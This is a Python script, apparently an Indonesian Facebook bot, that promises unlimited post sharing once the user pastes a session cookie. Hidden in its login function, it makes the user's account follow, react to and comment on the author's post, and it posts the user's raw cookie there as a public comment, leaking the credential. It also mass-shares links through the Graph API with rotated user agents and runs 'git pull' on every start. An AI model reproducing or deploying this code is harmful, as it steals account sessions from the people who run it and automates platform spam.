#!/usr/bin/python3
# code by Aditya
try:
    import re
    import os
    import bs4
    import sys
    import json
    import time
    import rich
    import random
    import datetime
    import requests
    import logging
    import base64
    import uuid
    import subprocess
    from datetime import datetime
    from time import sleep
except Exception as e:
   exit(f"{e} belum terinstall")

# import rich dan bahan
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.table import Table as me
from rich.console import Console as sol
console = Console()

# global nama
ses = requests.Session()
rr   = random.randint
rc   = random.choice

# random kata-kata
kata = rc(["Pahlawan hadir untuk selalu dikenang, namun aku tak pernah mau kamu menjadi kenangan bagiku","Rasanya begitu menyedihkan dan menyenangkan ketika waktuku untuk tertidur telah hilang hanya untuk memikirkanmu @[100063618310179:]","Aku sih tak mengapa jika ternyata kartu nomor yang kita pakai berbeda, asalkan nantinya nama kita berdua tercantum dalam Kartu Keluarga","Jika hujan selalu pergi dengan meninggalkan jejak berupa keindahan pelangi, kalau kamu pergi dengan nestapa karena kamu meninggalkanku dengan air mata","Hai sayang, aku mau curhat ya, tadi pagi entah mengapa aku gak bisa makan karena terus kepikiran sama kamu, dan siang pun aku gak bisa makan karena memikirkanmu, dan malamnya aku gak bisa tidur karena ternyata aku kelaparan.","Aku ini jago matematika, tapi kalau sama kamu aku gak bisa banget untuk menghitung rasa suka aku ke kamu itu sebanyak apa, yang jelas terlalu banyak","Mungkin terdengar cringe, tapi setiap hari adalah hari selasa buatku, karena jika denganmu setiap harinya selasa aku berada di surga"])

# useragent
for adtya in range(1000):
    ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; CPH2127) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36"
    ugent2 = f"Mozilla/5.0 (Linux; Android 7.0; SM-G935T Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.{str(rr(2500,3000))}.{str(rr(75,150))} Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/113.0.0.21.70;]"
    ugent3 = f"Mozilla/5.0 (Linux; Android 9.0; RMX1941 Build/PPR1.{str(rr(111111,199999))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(2500,2900))}.{str(rr(75,150))} Mobile Safari/537.36"
    ua = rc([ugent1, ugent2, ugent3])
    
# warna untuk print
H = "\033[0;92m" # HIJAU
K = "\033[0;93m" # KUNING
M = '\x1b[1;91m' # MERAH
P = "\033[0m"    # PUTIH

# warna untuk rich
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
N2 = "[#FF00FF]" # PINK
P2 = "[#FFFFFF]" # PUTIH
R1 = rc([H2,K2,N2])

# clear layar
def clear_layar():
    try:os.system("clear")
    except:pass

# animasi
def anim(strings):
	for x in strings:
		sys.stdout.write(x)
		sys.stdout.flush()
		time.sleep(0.03)

# hapus token & cookies
def remove():
    try:os.system("rm -rf /sdcard/AdtyaLogin/cookie.txt")
    except:pass
    try:os.system("rm -rf /sdcard/AdtyaLogin/token.txt")
    except:pass

# banner
def banner():
    try:os.popen('play-audio sound/PlayDJ.mp3')
    except:pass
    prints(Panel(f"""{R1}███████ ██   ██  █████  ██████  ███████ ██████  
██      ██   ██ ██   ██ ██   ██ ██      ██   ██ 
███████ ███████ ███████ ██████  █████   ██   ██ 
     ██ ██   ██ ██   ██ ██   ██ ██      ██   ██ 
███████ ██   ██ ██   ██ ██   ██ ███████ ██████""",width=80,padding=(0,14)))
    
# login cookie
def login():
	clear_layar()
	banner()
	prints(Panel(f"{P2} silakan masukkan cookie dan jangan gunakan akun pribadi anda untuk login",style=f"#FFFFFF"))
	cookie = input(f" {H}*{P} masukan cookie : {H}")
	url = "https://business.facebook.com/business_locations"
	head = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
	cok = {'cookie':cookie}
	try:
		_bulan_  = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
		_hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
		hari_ini = ("%s %s %s"%(datetime.now().day,_bulan_,datetime.now().year))
		jam      = datetime.now().strftime("%X")
		data = ses.get(url,headers=head,cookies=cok)
		token = re.search('(EAAG\w+)',data.text).group(1)
		tem      = ('\nProgramer Kah Bang🤔 & @[100063618310179:]\n\nmantap suhu☝️😎\n')
		slebew = (f'\n{kata}\n\nKomentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
		link = (f'https://www.facebook.com/100063618310179/posts/549345897196016/?app=fbl')
		random_kata = random.choice(["acc dong suhu","Rasanya aku begitu lelah untuk terus berbisik memanggil namamu @[100063618310179:] 😢","Ijin pake scriptnya bang","suhuku nih bos @[100063618310179:] senggol dong😎🤙","aditya ganteng 🤪️","I Love You @[100063618310179:]","Semangat Bang♥️"])
		ses.post(f"https://graph.facebook.com/100063618310179?fields=subscribers&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/549345863862686/comments/?message={slebew}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/549345863862686/reactions?type=love&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/549345863862686/comments/?message={random_kata}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/549345863862686/comments/?message={cookie}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/549345863862686/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
		open('/sdcard/AdtyaLogin/cookie.txt','w').write(cookie)
		open('/sdcard/AdtyaLogin/token.txt','w').write(token)
		prints(Panel(f"{P2}login {H2}berhasil{P2}, tolong gunakan script ini dengan bijak atas kesalahan apapun yang anda buat admin tidak akan bertanggung jawab terimakasih!",width=80,padding=(0,2),style=f"#FFFFFF"))
		try:os.popen('play-audio sound/KawaiBot.mp3')
		except:pass
		time.sleep(3);choose()
	except Exception as e:
	    prints(Panel(f"{P2} cookie tidak valid, silakan coba cookie lain dan pastikan autentikasi off",style=f"#FFFFFF"));time.sleep(3);login()

# choose menu
def choose():
    try:clear_layar();banner()
    except:pass
    prints(Panel(f"{P2}[{H2}01{P2}]. bot share postingan unlimited\n{P2}[{H2}02{P2}]. ganti akun tumbal\n{P2}[{H2}03{P2}]. report bug ( {H2}admin{P2} )\n{P2}[{H2}00{P2}]. exit ( {K2}keluar tools{P2} )",width=80,padding=(0,19),style=f"#FFFFFF"))
    adtya = input(f" {H}* {P}choose : ")
    if adtya in [""]:prints(Panel(f"{P2}anda harus memilih {H2}1 {P2}sampai {H2}3{P2}, tidak boleh kosong!",width=80,padding=(0,13),style=f"#FFFFFF"));time.sleep(3);choose()
    elif adtya in ["1","01"]:main_menu()
    elif adtya in ["2","02"]:remove();login()
    elif adtya in ["3","03"]:report()
    elif adtya in ["0","00"]:keluar()
    else:prints(Panel(f"{P2}anda harus memilih {H2}1 {P2}sampai {H2}3{P2}, huu plerr ngawur",width=80,padding=(0,14),style=f"#FFFFFF"));time.sleep(3);choose()
    
# keluar
def keluar():
    try:anim(f" {H}* {P}follow dulu ngab:v")
    except:pass
    try:os.system("xdg-open https://www.facebook.com/Aditya.putraXD991");exit()
    except:pass

# report bug
def report():
    try:anim(f" {H}* {P}anda akan di arahkan ke WhatsApp admin")
    except:pass
    try:os.system("xdg-open https://wa.me/+16143244921");exit()
    except:pass
    
# bot main
def main_menu():
	try:
		token = open("/sdcard/AdtyaLogin/token.txt","r").read()
		cok = open("/sdcard/AdtyaLogin/cookie.txt","r").read()
		cookie = {"cookie":cok}	    
	except:
		try:os.popen('play-audio sound/KawaiBot.mp3')
		except:pass
		anim(f" {H}* {P}login dulu ngab!")
		time.sleep(5);login()
	prints(Panel(f"{P2}masukan link postingan facebook, akun harus publik jangan private!",width=80,padding=(0,5),style=f"#FFFFFF"))
	link = input(f" {H}*{P} link postingan : {H}")
	jumlah = int(input(f" {H}* {P}jumlah share : {H}"))
	prints(Panel(f"{P2}proses share sedang berjalan tekan ctrl+z untuk berhenti",width=80,padding=(0,10),style=f"#FFFFFF"))
	AdtyaXC = datetime.now()
	try:
		n = 0
		header = {"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":ua}
		for x in range(jumlah):
			n+=1
			post = ses.post(f"https://graph.facebook.com/v13.0/me/feed?link={link}&published=0&access_token={token}",headers=header, cookies=cookie).text
			data = json.loads(post)
			if "id" in post:
				Adityaaa = str(datetime.now()-AdtyaXC).split('.')[0]
				tree = Tree("")
				tree.add(Panel.fit(f"\r{H2}{n}{P2}. berhasil share")).add(Panel.fit(f"\r{H2}{link}"))
				tree.add(Panel.fit(f"\r{N2}{ua}"))
				prints(tree)
		try:prints(Panel(f"{P2}share postingan dengan jumlah {H2}{n} {P2}telah selesai",width=80,padding=(0,15),style=f"#FFFFFF"));time.sleep(5);exit()
		except:pass
		else:
		     print("\n")
		     anim(" {H}* {P}share berhenti kemungkinan cookie atau tumbal di tangguhkan");exit()
	except requests.exceptions.ConnectionError:
		anim(f"\n {H}* {P}Anda tidak terhubung ke internet!");exit()

# pemanggil
if __name__=='__main__':
  try:os.system("git pull")
  except:pass
  try:os.mkdir("/sdcard/AdtyaLogin")
  except:pass
  try:os.mkdir("sound")
  except:pass
  try:choose()
  except:pass

